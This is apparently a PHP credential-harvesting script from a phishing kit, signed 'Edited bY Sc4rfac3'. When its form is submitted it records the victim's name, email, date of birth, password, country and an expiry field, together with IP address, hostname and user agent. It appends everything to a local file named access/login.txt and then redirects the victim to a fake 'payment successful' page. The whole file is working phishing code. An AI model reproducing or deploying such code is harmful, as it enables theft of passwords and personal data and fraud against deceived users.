<?php

if (isset($_POST['btn2'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "nombre            : ".$_POST['nya']."\n";
	$message .= "correo              : ".$_POST['correo']."\n";
	$message .= "DOB             : ".$_POST['dob']."\n";
	$message .= "contraseña               : ".$_POST['contra']."\n";

	$message .= "Pais               : ".$_POST['pais']."\n";

	$message .= "Exp               : ".$_POST['exp']."\n";

	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- Edited bY Sc4rfac3 --------------|\n";

	
	$save=fopen("access/login.txt","a+");
	          fwrite($save,$message);
	          fclose($save);

	          $discoverbank = [
              'text' => $message
              ]; 

		header("Location: ./payment-successfull.html");

	
}

?>